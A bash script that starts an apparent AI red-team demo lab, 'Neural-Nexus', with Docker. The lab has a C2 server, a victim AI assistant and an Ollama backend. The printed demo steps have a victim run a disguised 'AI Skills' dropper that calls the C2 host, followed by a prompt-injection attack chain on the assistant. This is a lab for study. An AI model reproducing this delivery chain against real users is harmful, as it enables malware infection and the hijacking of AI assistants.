#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
#  Neural-Nexus  ·  Demo Startup Script
#  Brings up the full attack/defence demo stack on a single Linux host.
#
#  Network layout (Docker bridge — nn-demo-net):
#    172.30.0.2   nn-c2           C2 operator UI
#    172.30.0.10  nn-victim-lab   CorpAI Assistant (RAG + JWT)
#    172.30.0.11  nn-victim-llm   Ollama LLM backend
#
#  Usage:
#    chmod +x start-demo.sh
#    sudo ./start-demo.sh           # full stack (recommended)
#    ./start-demo.sh --no-model     # skip llama3 pull (if already cached)
#    ./start-demo.sh --c2-only      # only bring up the C2
#    ./start-demo.sh --down         # tear everything down
# ─────────────────────────────────────────────────────────────────────────────

set -euo pipefail

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YEL='\033[1;33m'
CYN='\033[0;36m'; PRP='\033[0;35m'; BLD='\033[1m'; RST='\033[0m'

ok()   { echo -e "${GRN}  ✓${RST}  $*"; }
info() { echo -e "${CYN}  ●${RST}  $*"; }
warn() { echo -e "${YEL}  ⚠${RST}  $*"; }
fail() { echo -e "${RED}  ✗  $*${RST}"; exit 1; }
step() { echo -e "\n${BLD}${PRP}▶ $*${RST}"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Defaults ──────────────────────────────────────────────────────────────────
PULL_MODEL=true
C2_ONLY=false
TEAR_DOWN=false
OLLAMA_MODEL="${OLLAMA_MODEL:-llama3}"

# ── Argument parsing ──────────────────────────────────────────────────────────
for arg in "$@"; do
  case "$arg" in
    --no-model)  PULL_MODEL=false ;;
    --c2-only)   C2_ONLY=true ;;
    --down)      TEAR_DOWN=true ;;
    --help|-h)
      sed -n '3,12p' "$0" | sed 's/^# //'
      exit 0 ;;
    *) warn "Unknown argument: $arg" ;;
  esac
done

# ── Banner ────────────────────────────────────────────────────────────────────
clear
echo -e "${PRP}"
cat << 'BANNER'
  ███╗   ██╗███████╗██╗   ██╗██████╗  █████╗ ██╗         ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
  ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔══██╗██║         ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝███████║██║         ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██╔══██║██║         ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
  ██║ ╚████║███████╗╚██████╔╝██║  ██║██║  ██║███████╗    ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
  ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
BANNER
echo -e "${RST}"
echo -e "  ${BLD}AI Red Team Demo Stack${RST}  ·  C2 + Victim Lab + LLM"
echo -e "  ${YEL}────────────────────────────────────────────────────────────────${RST}\n"

cd "$SCRIPT_DIR"

# ── Tear-down mode ────────────────────────────────────────────────────────────
if $TEAR_DOWN; then
  step "Tearing down demo stack"
  docker compose down --remove-orphans -v 2>/dev/null && ok "Stack removed" || warn "Nothing to remove"
  docker network rm nn-demo-net 2>/dev/null && ok "Network nn-demo-net removed" || true
  exit 0
fi

# ── Preflight checks ──────────────────────────────────────────────────────────
step "Preflight checks"

# Docker
if command -v docker &>/dev/null; then
  DOCKER_VER=$(docker version --format '{{.Server.Version}}' 2>/dev/null || echo "unknown")
  ok "Docker $DOCKER_VER"
else
  fail "Docker not found — install: https://docs.docker.com/engine/install/"
fi

# docker compose (v2 plugin preferred, fall back to docker-compose v1)
if docker compose version &>/dev/null 2>&1; then
  COMPOSE_CMD="docker compose"
  COMPOSE_VER=$(docker compose version --short 2>/dev/null || echo "v2")
  ok "Docker Compose $COMPOSE_VER  (plugin)"
elif command -v docker-compose &>/dev/null; then
  COMPOSE_CMD="docker-compose"
  COMPOSE_VER=$(docker-compose version --short 2>/dev/null || echo "v1")
  warn "Using legacy docker-compose v1 — upgrade recommended"
  ok "docker-compose $COMPOSE_VER"
else
  fail "docker compose not found. Install Docker Desktop or the compose plugin."
fi

# Check compose file exists
[[ -f "$SCRIPT_DIR/docker-compose.yml" ]] || fail "docker-compose.yml not found in $SCRIPT_DIR"
ok "docker-compose.yml found"

# Available RAM (warn if < 4 GB — Ollama needs headroom)
if command -v free &>/dev/null; then
  TOTAL_MB=$(free -m | awk '/Mem:/{print $2}')
  if (( TOTAL_MB < 4096 )); then
    warn "Only ${TOTAL_MB}MB RAM detected. Ollama may be slow (recommended: 8GB+)"
  else
    ok "RAM: ${TOTAL_MB}MB"
  fi
fi

# ── Network setup ──────────────────────────────────────────────────────────────
step "Docker network — nn-demo-net (172.30.0.0/24)"

if docker network inspect nn-demo-net &>/dev/null 2>&1; then
  ok "Network nn-demo-net already exists"
else
  docker network create \
    --driver bridge \
    --subnet 172.30.0.0/24 \
    --gateway 172.30.0.1 \
    nn-demo-net &>/dev/null && ok "Network nn-demo-net created"
fi

# ── Build images ───────────────────────────────────────────────────────────────
step "Building Docker images"

if $C2_ONLY; then
  info "C2-only mode — building nn-c2 only"
  $COMPOSE_CMD build c2
else
  $COMPOSE_CMD build c2 victim-lab
fi
ok "Images built"

# ── Start services ─────────────────────────────────────────────────────────────
step "Starting services"

if $C2_ONLY; then
  info "Starting C2 only"
  $COMPOSE_CMD up -d c2
else
  info "Starting victim-llm (Ollama) first..."
  $COMPOSE_CMD up -d victim-llm

  info "Starting victim-lab..."
  $COMPOSE_CMD up -d victim-lab

  info "Starting C2..."
  $COMPOSE_CMD up -d c2
fi

ok "Containers started"

# ── Health checks ──────────────────────────────────────────────────────────────
step "Waiting for services to become healthy"

_wait_http() {
  local name="$1" url="$2" max="${3:-60}" i=0
  printf "  %-20s " "$name"
  while (( i < max )); do
    if curl -sf --max-time 2 "$url" >/dev/null 2>&1; then
      echo -e "${GRN}UP${RST}"
      return 0
    fi
    printf "."
    sleep 2
    (( i += 2 ))
  done
  echo -e "${RED}TIMEOUT${RST}"
  return 1
}

C2_OK=false; VICTIM_OK=false; LLM_OK=false

_wait_http "C2  (172.30.0.2)"        "http://localhost:5001"       90  && C2_OK=true     || warn "C2 did not respond"
if ! $C2_ONLY; then
  _wait_http "Victim-lab (172.30.0.10)" "http://localhost:8080/health" 90  && VICTIM_OK=true || warn "Victim-lab did not respond"
  _wait_http "Ollama (172.30.0.11)"     "http://localhost:11434/api/tags" 120 && LLM_OK=true || warn "Ollama did not respond"
fi

# ── Pull LLM model ─────────────────────────────────────────────────────────────
if ! $C2_ONLY && $PULL_MODEL && $LLM_OK; then
  step "Pulling LLM model ($OLLAMA_MODEL) — may take several minutes on first run"
  if docker exec nn-victim-llm ollama list 2>/dev/null | grep -q "$OLLAMA_MODEL"; then
    ok "Model $OLLAMA_MODEL already cached"
  else
    info "Pulling $OLLAMA_MODEL (this is a one-time ~4GB download)..."
    docker exec nn-victim-llm ollama pull "$OLLAMA_MODEL" && ok "Model ready" || warn "Model pull failed — run manually: docker exec nn-victim-llm ollama pull $OLLAMA_MODEL"
  fi
fi

# ── Summary ────────────────────────────────────────────────────────────────────
step "Demo stack is ready"

echo ""
echo -e "  ${BLD}${PRP}Network: nn-demo-net (172.30.0.0/24)${RST}"
echo -e "  ${YEL}┌───────────────────────────────────────────────────────────────┐${RST}"
printf  "  ${YEL}│${RST}  %-18s  %-18s  %-22s  ${YEL}│${RST}\n" "Container" "Docker IP" "Host URL"
echo -e "  ${YEL}├───────────────────────────────────────────────────────────────┤${RST}"

_status() { $1 && echo -e "${GRN}UP${RST}" || echo -e "${RED}DOWN${RST}"; }
printf  "  ${YEL}│${RST}  %-18s  %-18s  %-22s  ${YEL}│${RST}\n" \
    "nn-c2"          "172.30.0.2:5000"   "http://localhost:5001"
printf  "  ${YEL}│${RST}  %-18s  %-18s  %-22s  ${YEL}│${RST}\n" \
    "nn-victim-lab"  "172.30.0.10:8080"  "http://localhost:8080"
printf  "  ${YEL}│${RST}  %-18s  %-18s  %-22s  ${YEL}│${RST}\n" \
    "nn-victim-llm"  "172.30.0.11:11434" "http://localhost:11434"
echo -e "  ${YEL}└───────────────────────────────────────────────────────────────┘${RST}"

echo ""
echo -e "  ${BLD}Demo steps:${RST}"
echo -e "  ${CYN}①${RST}  Victim opens ${BLD}http://localhost:8080${RST} (CorpAI Assistant)"
echo -e "  ${CYN}②${RST}  Victim clicks ${BLD}\"Install Neural Nexus AI Skills\"${RST} → downloads skill"
echo -e "  ${CYN}③${RST}  Victim runs the dropper:"
echo -e "      ${YEL}python victim-lab/skill/neural_nexus_skill.py --c2 http://172.30.0.2:5000${RST}"
echo -e "      ${YEL}# from host:  --c2 http://localhost:5001${RST}"
echo -e "  ${CYN}④${RST}  Operator opens ${BLD}http://localhost:5001${RST} → sees new agent check in"
echo -e "  ${CYN}⑤${RST}  Run AutoRecon on the agent → detects 172.30.0.10:8080"
echo -e "  ${CYN}⑥${RST}  Click ${BLD}\"LAUNCH AI HUNTER\"${RST} → prompt injection attack chain"
echo ""

HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "localhost")
if [[ "$HOST_IP" != "localhost" ]]; then
  echo -e "  ${BLD}Remote access (replace localhost):${RST}"
  echo -e "  C2  →  ${CYN}http://${HOST_IP}:5001${RST}"
  echo -e "  Lab →  ${CYN}http://${HOST_IP}:8080${RST}"
  echo ""
fi

echo -e "  ${BLD}Useful commands:${RST}"
echo -e "  ${YEL}docker compose logs -f nn-c2${RST}          # C2 live logs"
echo -e "  ${YEL}docker compose logs -f nn-victim-lab${RST}   # Victim-lab logs"
echo -e "  ${YEL}docker network inspect nn-demo-net${RST}     # Verify IPs"
echo -e "  ${YEL}./start-demo.sh --down${RST}                 # Tear down"
echo ""
